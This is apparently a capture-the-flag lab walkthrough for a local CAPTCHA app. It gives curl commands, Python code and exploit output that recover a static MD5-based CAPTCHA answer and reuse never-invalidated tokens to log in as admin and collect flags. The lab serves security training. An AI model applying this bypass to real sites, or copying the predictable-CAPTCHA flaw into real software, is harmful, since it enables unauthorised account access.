# CAPTCHA Bypass: Full Walkthrough

## Setup

```
docker compose up --build -d
```

Verify:

```
curl -s http://127.0.0.1:8111/
```

Output includes `CaptchaApp v2.1`.

## Step 1: Fetch the CAPTCHA

```
curl -s http://127.0.0.1:8111/captcha
```

Output:

```json
{
  "challenge": "Solve: MD5(captcha-seed-2024)[:6]",
  "flag1": "POC{<hex>}",
  "token": "<token>"
}
```

**Flag 1** is in the `flag1` field. Note the `challenge` field: it discloses the seed directly.

## Step 2: Compute the answer

```python
import hashlib
answer = hashlib.md5(b'captcha-seed-2024').hexdigest()[:6]
print(answer)
```

The answer is always the same value regardless of when you run this.

## Step 3: Log in with the computed answer

```bash
TOKEN=$(curl -s http://127.0.0.1:8111/captcha | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
ANSWER=$(python3 -c "import hashlib; print(hashlib.md5(b'captcha-seed-2024').hexdigest()[:6])")

curl -s -X POST -H 'Content-Type: application/json' \
  -d "{\"username\":\"admin\",\"password\":\"admin123\",\"captcha_token\":\"$TOKEN\",\"captcha_answer\":\"$ANSWER\"}" \
  http://127.0.0.1:8111/login
```

Output:

```json
{"flag2": "POC{<hex>}", "message": "Welcome, admin!", "success": true}
```

**Flag 2** is in the `flag2` field.

## Automated exploit

```
python3 exploit/exploit.py http://127.0.0.1:8111
```

Output:

```
[*] Target: http://127.0.0.1:8111

[+] CAPTCHA token obtained: a1b2c3d4e5f60718
[+] Flag 1: POC{<hex>}
[+] Computed CAPTCHA answer: 8f14e4
[+] Flag 2: POC{<hex>}

[+] Exploit complete
    Flag 1: POC{<hex>}
    Flag 2: POC{<hex>}
```

## Full attack chain

```
Attacker
  |
  v
GET /captcha
  |
  |-- Server returns token + challenge "Solve: MD5(captcha-seed-2024)[:6]"
  |-- Flag 1 also returned here
  |
  v
Compute: hashlib.md5(b'captcha-seed-2024').hexdigest()[:6]
  |
  v
POST /login  {captcha_token: <token>, captcha_answer: <computed>}
  |
  |-- Answer matches static CAPTCHA_ANSWER (bug 1: predictable)
  |-- Token found in _valid_tokens (bug 2: never invalidated)
  |
  v
Login succeeds -> Flag 2 returned
```

## Tools used

| Tool | Purpose |
|------|---------|
| curl | Fetch CAPTCHA token and submit login |
| exploit.py | Automated CAPTCHA bypass |
| hashlib (Python stdlib) | Compute MD5 answer |

## Teardown

```
docker compose down
```
